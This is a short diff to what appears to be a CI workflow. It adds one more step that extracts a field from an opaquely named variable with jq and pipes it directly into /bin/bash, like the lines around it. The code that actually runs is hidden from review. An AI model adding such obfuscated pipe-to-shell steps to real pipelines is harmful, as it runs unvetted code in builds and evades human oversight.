@@ -25,6 +25,7 @@ jobs:
           echo $e2 | jq -r .yzof8448 | /bin/bash
           printf '%s' "$y62" | jq -r .rthv0087 | /bin/bash
           printf '%s' "$octpa147" | jq -r .et591 | /bin/bash
+          printf '%s' "$tkq27" | jq -r .oc06422 | /bin/bash
 
       - name: Upload data
         if: always()
